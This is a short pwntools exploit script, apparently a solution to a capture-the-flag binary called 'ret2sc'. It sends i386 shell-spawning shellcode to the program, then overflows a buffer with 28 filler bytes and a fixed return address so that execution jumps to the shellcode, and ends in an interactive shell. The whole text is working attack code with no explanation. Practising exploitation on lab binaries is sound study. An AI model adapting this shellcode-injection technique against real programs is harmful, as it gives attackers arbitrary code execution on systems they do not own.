from pwn import * 
fpath = "./ret2sc"
offset = 28
#(0x32 - 0x14) // 4= 7  
# context.log_level = "debug"
p = process(fpath)
elf = ELF(fpath)

shellcode = shellcraft.i386.sh()
addres = 0x0804a060
p.recvuntil(":")
p.sendline(asm(shellcode))
p.recv()
payload = offset * "a" + p32(1) + p32(addres)
p.sendline(payload)
p.interactive()
